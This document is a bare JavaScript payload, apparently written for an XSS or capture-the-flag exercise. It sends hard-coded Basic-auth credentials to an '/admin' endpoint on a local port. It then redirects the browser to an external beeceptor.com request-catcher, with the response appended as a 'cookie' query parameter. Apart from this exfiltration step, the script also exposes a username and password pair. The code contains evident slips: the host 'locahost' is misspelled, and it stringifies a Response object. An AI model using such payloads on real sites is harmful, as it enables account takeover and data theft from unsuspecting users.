(async () => {
  
  let headers = new Headers();
  headers.set('Authorization', 'Basic ' + btoa('dev_us' + ":" + 'valera_smeni_kredi_4mo'));
  const res = await fetch('http://locahost:31337/admin', {headers});
  window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + JSON.stringify(res))
})()
